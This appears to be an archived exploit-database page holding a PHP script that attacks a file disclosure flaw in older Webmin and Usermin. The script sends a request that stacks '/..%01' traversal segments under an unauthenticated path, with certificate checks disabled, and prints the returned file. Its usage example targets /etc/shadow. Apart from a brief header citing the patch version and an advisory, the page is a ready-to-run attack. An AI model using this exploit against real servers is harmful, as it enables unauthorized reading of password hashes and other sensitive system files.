<html><head><title>Webmin < 1.290 / Usermin < 1.220 Arbitrary File Disclosure Exploit </title></head><pre>&lt;?php
/*
Name : Webmin / Usermin Arbitrary File Disclosure Vulnerability
Date :  2006-06-30
Patch : update to version 1.290
Advisory : http://securitydot.net/vuln/exploits/vulnerabilities/articles/17885/vuln.html
Coded by joffer , http://securitydot.net
*/

$host = $argv[1];
$port = $argv[2];
$http = $argv[3];
$file = $argv[4];
// CHECKING THE INPUT
if($host != &quot;&quot; &amp;&amp; $port != &quot;&quot; &amp;&amp; $http != &quot;&quot; &amp;&amp; $file != &quot;&quot;) {


$z = &quot;/..%01&quot;;
for ($i=0;$i&lt;60;$i++) {
        $z.=&quot;/..%01&quot;;
}

$target = $http.&quot;://&quot;.$host.&quot;:&quot;.$port.&quot;/unauthenticated&quot;.$z.&quot;/&quot;.$file.&quot;&quot;;

echo &quot;Attacking &quot;.$host.&quot;\n&quot;;
echo &quot;---------------------------------\n&quot;;

// INITIALIZING CURL SESSION TO THE TARGET

$ch = curl_init();

curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_URL, $target);
curl_setopt ($ch, CURLOPT_TIMEOUT, '10');
curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,FALSE);

$content = curl_exec($ch);
curl_close ($ch);

// CLOSING CURL

// ECHOING THE CONTENT OF THE $FILE
echo $content;

echo &quot;---------------------------------\n&quot;;
echo &quot;Coded by joffer , http://securitydot.net\n&quot;;

} else {
        // IF INPUT IS NOT CORRECT DISPLAY THE README
        echo &quot;Usage php webmin.php HOST PORT HTTP/HTTPS FILE\n&quot;;
        echo &quot;Example : php webmin.php localhost 10000 http /etc/shadow\n&quot;;
        echo &quot;Coded by joffer , http://securitydot.net\n&quot;;
}

?&gt;

# milw0rm.com [2006-07-09]</pre></html>